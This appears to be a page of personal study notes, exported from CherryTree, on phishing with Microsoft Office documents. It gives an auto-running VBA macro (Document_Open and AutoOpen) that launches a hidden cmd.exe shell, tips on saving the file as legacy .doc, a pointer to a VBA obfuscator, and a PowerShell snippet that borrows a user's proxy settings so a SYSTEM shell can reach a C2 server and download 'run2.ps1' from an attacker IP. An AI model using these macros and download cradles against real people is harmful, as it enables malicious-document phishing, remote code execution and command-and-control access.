<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Phishing with Office (THEORY)</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Phishing with Office (THEORY)</h1><br/><p><h2> intro</h2><ul><li>• <small>• declare VBA variables before using them via Dim</small></li><li></li></ul><div class="codebox"><pre>Dim myString As String<br />Dim myLong As Long<br />Dim myPointer As LongPtr</pre></div><ul><li>• <small>• enable content =&gt; execute macro</small></li><li><small>Applied protection view when files originate from internet</small></li></ul><small></small></p><p><small></small></p><p></p><p></p><p><h2>Shell</h2><ul><li>• <small>• View =&gt; macros =&gt; in the droppodwon select our document</small></li><li><small>s</small><small>ave the document in the legacy </small><strong><small>.doc</small></strong><small> format (also called </small><em><small>Word 97-2003 Document</small></em><small>) and</small></p><p></li></ul><div class="codebox"><pre>Sub Document_Open<span style="color:#ff9d00;font-weight:700">()</span><br />    MyMacro<br />End Sub<br /><br />Sub AutoOpen<span style="color:#ff9d00;font-weight:700">()</span><br />    MyMacro<br />End Sub<br /><br />Sub MyMacro<span style="color:#ff9d00;font-weight:700">()</span><br />    Dim str As String<br />    str = <span style="color:#3ad900;font-weight:400">&quot;cmd.exe&quot;</span><br />    Shell str, vbHide<br />End Sub</pre></div></p><p></p><p></p><p><h2>Other obfuscation techniques</h2><ul><li><span style="text-decoration:underline;">https://github.com/bonnetn/vba-obfuscator</span></li></ul></p><p></p><p></p><p><h2>Proxy-unaware shells bypass</h2><ul><li> <small> if we have SYSTEM integrity shell =&gt; proxy unaware =&gt; can&#39;t get back to our c2 server </small></li><li><small>In order to run our session through a proxy, we must create a proxy configuration for the built-in SYSTEM account.</small></li><li><small> One way to do this is to copy a configuration from a standard user account on the system.</small><ul><li><small>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\InternetSettings</small></li><li><small>When navigating the registry, the HKEY_CURRENT_USER registry hive is mapped according to the</small></li></ul></li></ul><small></small></p><p><small>user trying to access it, but when navigating the registry as SYSTEM, no such registry hive exists.</small></p><p><ul><li></li></ul><img src="images/41-1.png" alt="images/41-1.png" /></p><p><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">New-PSDrive</span> <span style="color:#333333;font-weight:400">-Name</span> HKU <span style="color:#ff9d00;font-weight:700">-</span>PSProvider Registry <span style="color:#ff9d00;font-weight:700">-</span>Root HKEY_USERS | <span style="color:#ff9d00;font-weight:700">Out-Null</span><br /><span style="color:#0088ff;font-weight:400">$keys</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#ff9d00;font-weight:700">Get-ChildItem</span> <span style="color:#333333;font-weight:400">&#39;HKU:\&#39;</span><br /><span style="color:#ff9d00;font-weight:700">ForEach</span> (<span style="color:#0088ff;font-weight:400">$key</span> <span style="color:#ff9d00;font-weight:700">in</span> <span style="color:#0088ff;font-weight:400">$keys</span>) {<span style="color:#ff9d00;font-weight:700">if</span> (<span style="color:#0088ff;font-weight:400">$key</span>.Name <span style="color:#ff9d00;font-weight:700">-like</span> <span style="color:#3ad900;font-weight:400">&quot;*S-1-5-21-*&quot;</span>) {<span style="color:#0088ff;font-weight:400">$start</span> <span style="color:#ff9d00;font-weight:700">=</span><br /><span style="color:#0088ff;font-weight:400">$key</span>.Name.substring(<span style="color:#333333;font-weight:400">10</span>);<span style="color:#ff9d00;font-weight:700">break</span>}}<br /><span style="color:#0088ff;font-weight:400">$proxyAddr</span><span style="color:#ff9d00;font-weight:700">=</span>(<span style="color:#ff9d00;font-weight:700">Get-ItemProperty</span> <span style="color:#ff9d00;font-weight:700">-</span>Path <span style="color:#3ad900;font-weight:400">&quot;HKU:$start\Software\Microsoft\Windows\CurrentVersion\Internet Settings\&quot;</span>).ProxyServer<br />[system.net.webrequest]<span style="color:#ff9d00;font-weight:700">::</span>DefaultWebProxy <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#ff9d00;font-weight:700">new-object</span> System.Net.WebProxy(<span style="color:#3ad900;font-weight:400">&quot;http://$proxyAddr&quot;</span>)<br /><span style="color:#0088ff;font-weight:400">$wc</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#ff9d00;font-weight:700">new-object</span> system.net.WebClient<br /><span style="color:#0088ff;font-weight:400">$wc</span>.DownloadString(<span style="color:#3ad900;font-weight:400">&quot;http://192.168.119.120/run2.ps1&quot;</span>)</pre></div></p></div>
</body>
</html>
